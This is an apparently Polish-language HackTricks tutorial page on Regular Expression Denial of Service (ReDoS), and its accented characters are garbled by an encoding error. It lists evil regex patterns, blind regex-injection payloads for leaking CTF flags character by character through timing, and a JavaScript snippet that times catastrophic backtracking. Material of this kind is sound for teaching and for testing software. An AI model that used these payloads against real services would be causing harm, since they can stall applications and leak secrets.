# Regular expression Denial of Service - ReDoS

<details>

<summary><strong>Dowiedz siÄ™, jak hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

# Regular Expression Denial of Service (ReDoS)

**Regular Expression Denial of Service (ReDoS)** wystÄ™puje, gdy ktoÅ› wykorzystuje sÅ‚aboÅ›ci w dziaÅ‚aniu wyraÅ¼eÅ„ regularnych (sposobu wyszukiwania i dopasowywania wzorcÃ³w w tekÅ›cie). Czasami, gdy uÅ¼ywane sÄ… wyraÅ¼enia regularne, mogÄ… staÄ‡ siÄ™ bardzo wolne, zwÅ‚aszcza jeÅ›li fragment tekstu, z ktÃ³rym pracujÄ…, staje siÄ™ wiÄ™kszy. Ta wolnoÅ›Ä‡ moÅ¼e byÄ‡ tak duÅ¼a, Å¼e roÅ›nie bardzo szybko nawet przy niewielkim zwiÄ™kszeniu rozmiaru tekstu. AtakujÄ…cy mogÄ… wykorzystaÄ‡ ten problem, aby sprawiÄ‡, Å¼e program korzystajÄ…cy z wyraÅ¼eÅ„ regularnych przestanie dziaÅ‚aÄ‡ poprawnie przez dÅ‚ugi czas.


## Problematyczny algorytm naiwny dla wyraÅ¼eÅ„ regularnych

**SprawdÅº szczegÃ³Å‚y na stronie [https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)**


## ZÅ‚oÅ›liwe wyraÅ¼enia regularne <a href="#evil-regexes" id="evil-regexes"></a>

ZÅ‚oÅ›liwy wzorzec wyraÅ¼enia regularnego to taki, ktÃ³ry moÅ¼e **utknÄ…Ä‡ na spreparowanym wejÅ›ciu, powodujÄ…c DoS**. ZÅ‚oÅ›liwe wzorce wyraÅ¼eÅ„ regularnych zwykle zawierajÄ… grupowanie z powtÃ³rzeniem oraz powtÃ³rzenie lub alternacjÄ™ z zachodzeniem na siebie wewnÄ…trz powtarzanej grupy. PrzykÅ‚ady zÅ‚oÅ›liwych wzorcÃ³w to:

* (a+)+
* ([a-zA-Z]+)*
* (a|aa)+
* (a|a?)+
* (.*a){x} dla x > 10

Wszystkie te wzorce sÄ… podatne na wejÅ›cie `aaaaaaaaaaaaaaaaaaaaaaaa!`.

## Payloady ReDoS

### Wyciek ciÄ…gu znakÃ³w za pomocÄ… ReDoS

W CTF (lub bug bounty) byÄ‡ moÅ¼e **masz kontrolÄ™ nad wyraÅ¼eniem regularnym, z ktÃ³rym dopasowane jest wraÅ¼liwe informacje (flaga)**. W takim przypadku moÅ¼e byÄ‡ przydatne **zatrzymanie strony (przekroczenie czasu lub dÅ‚uÅ¼szy czas przetwarzania)**, jeÅ›li **wyraÅ¼enie regularne zostanie dopasowane**, a **nie jeÅ›li nie zostanie**. W ten sposÃ³b bÄ™dziesz mÃ³gÅ‚ **wyciekaÄ‡** ciÄ…g znakÃ³w **po jednym znaku**:

* W [**tym poÅ›cie**](https://portswigger.net/daily-swig/blind-regex-injection-theoretical-exploit-offers-new-way-to-force-web-apps-to-spill-secrets) znajdziesz tÄ™ reguÅ‚Ä™ ReDoS: `^(?=<flag>)((.*)*)*salt$`
* PrzykÅ‚ad: `^(?=HTB{sOmE_flÂ§NÂ§)((.*)*)*salt$`
* W [**tym rozwiÄ…zaniu**](https://github.com/jorgectf/Created-CTF-Challenges/blob/main/challenges/TacoMaker%20%40%20DEKRA%20CTF%202022/solver/solver.html) znajdziesz to: `<flag>(((((((.*)*)*)*)*)*)*)!`
* W [**tym rozwiÄ…zaniu**](https://ctftime.org/writeup/25869) uÅ¼yÅ‚: `^(?=${flag_prefix}).*.*.*.*.*.*.*.*!!!!$`

### Kontrolowanie wejÅ›cia i wyraÅ¼enia regularnego w ReDoS

PoniÅ¼ej znajdujÄ… siÄ™ przykÅ‚ady **ReDoS**, w ktÃ³rych **kontrolujesz zarÃ³wno wejÅ›cie**, jak i **wyraÅ¼enie regularne**:
```javascript
function check_time_regexp(regexp, text){
var t0 = new Date().getTime();;
new RegExp(regexp).test(text);
var t1 = new Date().getTime();;
console.log("Regexp " + regexp + " took " + (t1 - t0) + " milliseconds.")
}

// This payloads work because the input has several "a"s
[
//  "((a+)+)+$",  //Eternal,
//  "(a?){100}$", //Eternal
"(a|a?)+$",
"(\\w*)+$",   //Generic
"(a*)+$",
"(.*a){100}$",
"([a-zA-Z]+)*$", //Generic
"(a+)*$",
].forEach(regexp => check_time_regexp(regexp, "aaaaaaaaaaaaaaaaaaaaaaaaaa!"))

/*
Regexp (a|a?)+$ took 5076 milliseconds.
Regexp (\w*)+$ took 3198 milliseconds.
Regexp (a*)+$ took 3281 milliseconds.
Regexp (.*a){100}$ took 1436 milliseconds.
Regexp ([a-zA-Z]+)*$ took 773 milliseconds.
Regexp (a+)*$ took 723 milliseconds.
*/
```
## NarzÄ™dzia

* [https://github.com/doyensec/regexploit](https://github.com/doyensec/regexploit)
* [https://devina.io/redos-checker](https://devina.io/redos-checker)

## OdwoÅ‚ania
* [https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)
* [https://portswigger.net/daily-swig/blind-regex-injection-theoretical-exploit-offers-new-way-to-force-web-apps-to-spill-secrets](https://portswigger.net/daily-swig/blind-regex-injection-theoretical-exploit-offers-new-way-to-force-web-apps-to-spill-secrets)
* [https://github.com/jorgectf/Created-CTF-Challenges/blob/main/challenges/TacoMaker%20%40%20DEKRA%20CTF%202022/solver/solver.html](https://github.com/jorgectf/Created-CTF-Challenges/blob/main/challenges/TacoMaker%20%40%20DEKRA%20CTF%202022/solver/solver.html)
* [https://ctftime.org/writeup/25869](https://ctftime.org/writeup/25869)

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
